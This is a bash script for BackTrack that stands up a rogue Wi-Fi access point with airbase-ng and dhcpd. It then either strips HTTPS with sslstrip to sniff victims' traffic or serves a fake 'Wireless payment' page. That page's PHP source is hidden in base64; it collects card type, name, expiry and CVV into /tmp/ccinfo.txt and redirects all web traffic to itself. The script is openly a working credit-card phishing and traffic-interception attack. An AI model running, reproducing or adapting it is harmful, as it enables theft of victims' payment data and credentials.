#!/bin/bash
#This script is made to be used with backtrack

if [ -z "$1" -o -z "$2" ]; then
 echo "Usage: user@user:~# sh fakeAP.sh <SSID> <type>"
 echo "Types: sniff / CC"
 echo "sniff - runs sslstrip and just allows you to sniffer traffic"
 echo "CC - attempts to get victims CC info"
 exit 1
fi
echo "***setting up fakeAP"
ctrlc(){
 echo "***stopping"
 iptables --flush
 echo 0 > /proc/sys/net/ipv4/ip_forward
 kill `pidof airbase-ng` >/dev/null
 if [ -n "$PIDofsslstrip" ]
 then
  kill $PIDofsslstrip >/dev/null
 fi
 airmon-ng stop mon0 >/dev/null
 /etc/init.d/dhcp3-server stop >/dev/null
 echo "***k bye"
 exit 0
}
trap ctrlc SIGINT SIGTERM
echo "***Installing dhcpd"
dpkg -i /media/cdrom/cdrom/dhcp3-server_3.1.3-2ubuntu3.3_amd64.deb >/dev/null
echo "***starting mon0"
airmon-ng stop wlan0 >/dev/null
airmon-ng start wlan0 >/dev/null
echo "***starting AP with SSID $1"
airbase-ng -c 6 -P -e "$1" mon0 & >/dev/null
sleep 7
ifconfig at0 up 192.168.121.1 netmask 255.255.255.0 >/dev/null
echo "***starting dhcpd"
dhcpfile="ZGVmYXVsdC1sZWFzZS10aW1lIDYwOw0KbWF4LWxlYXNlLXRpbWUgNzI7DQpkZG5zLXVwZGF0ZS1zdHlsZSBub25lOw0KYXV0aG9yaXRhdGl2ZTsNCmxvZy1mYWNpbGl0eSBsb2NhbDc7DQpzdWJuZXQgMTkyLjE2OC4xMjEuMCBuZXRtYXNrIDI1NS4yNTUuMjU1LjAgew0KICByYW5nZSAxOTIuMTY4LjEyMS4xMDAgMTkyLjE2OC4xMjEuMjU0Ow0KICBvcHRpb24gcm91dGVycyAxOTIuMTY4LjEyMS4xOw0KICBvcHRpb24gZG9tYWluLW5hbWUtc2VydmVycyA4LjguOC44Ow0KfQ=="
echo "$dhcpfile"|base64 -d > /etc/dhcp3/dhcpd.conf
sed -i s/INTERFACES=\"\"/INTERFACES=\"at0\"/ /etc/default/dhcp3-server
/etc/init.d/dhcp3-server start >/dev/null
case "$2" in
 sniff)
  echo "***setting up sniff option"
  echo "***setting up routing"
  iptables -t nat -A POSTROUTING -o wlan0 -s 192.168.121.0/24 -j MASQUERADE 
  echo 1 > /proc/sys/net/ipv4/ip_forward
  echo "***setting up sslstrip"
  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
  python /pentest/web/sslstrip/sslstrip.py & >/dev/null
  PIDofsslstrip=$!
  sleep 5
  echo "***starting wireshark for you"
  /usr/local/bin/wireshark & >/dev/null
  sleep 5
  ;;
 CC)
  echo "***setting up CC option"
  /etc/init.d/apache2 start >/dev/null
  rm /var/www/index.html
  phpfile="PD8NCmlmKGlzc2V0KCRfUE9TVFsiY3QiXSkpew0KICRmcCA9IGZvcGVuKCcvdG1wL2NjaW5mby50eHQnLCAnYSsnKTsNCiBmd3JpdGUoJGZwLCBwcmludF9yKCRfUE9TVCwgdHJ1ZSkpOw0KIGZjbG9zZSgkZnApOw0KIGVjaG8gIjxjZW50ZXI+VGhlcmUgd2FzIGFuIGlzc3VlLCBwbGVhc2UgdHJ5IGFnYWluIGxhdGVyIG9yIHVzZSBhbm90aGVyIGNhcmQuPC9jZW50ZXI+IjsNCiBkaWUoKTsNCn0NCmVjaG8gJzxjZW50ZXI+PGJpZz48YmlnPldpcmVsZXNzIHBheW1lbnQ8L2JpZz48L2JpZz48L2NlbnRlUj48Zm9ybSBhY3Rpb249Imh0dHA6Ly8xOTIuMTY4LjEyMS4xL2luZGV4LnBocCIgbWV0aG9kPSJwb3N0Ij4nOw0KZWNobyAiQ2FyZCB0eXBlOiA8aW5wdXQgdHlwZT10ZXh0IG5hbWU9Y3Q+PEJSPiI7DQplY2hvICJOYW1lIG9uIGNhcmQ6IDxpbnB1dCB0eXBlPXRleHQgbmFtZT1jbj48QlI+IjsNCmVjaG8gIkV4cC4gZGF0ZTogPGlucHV0IHR5cGU9dGV4dCBuYW1lPWV4cD48QlI+IjsNCmVjaG8gIkNWVjogPGlucHV0IHR5cGU9dGV4dCBuYW1lPWN2dj48QlI+IjsNCmVjaG8gIjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT1TdWJtaXQ+IjsNCj8+"
  echo "$phpfile"|base64 -d > /var/www/index.php
  echo 1 > /proc/sys/net/ipv4/ip_forward
  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j DNAT --to-destination 192.168.121.1:80
  iptables -t nat -A POSTROUTING -j MASQUERADE
esac
echo -e "\n***fakeAP is now running with option $2, hit ctrl+c to exit"
while :
do
 sleep 1
done
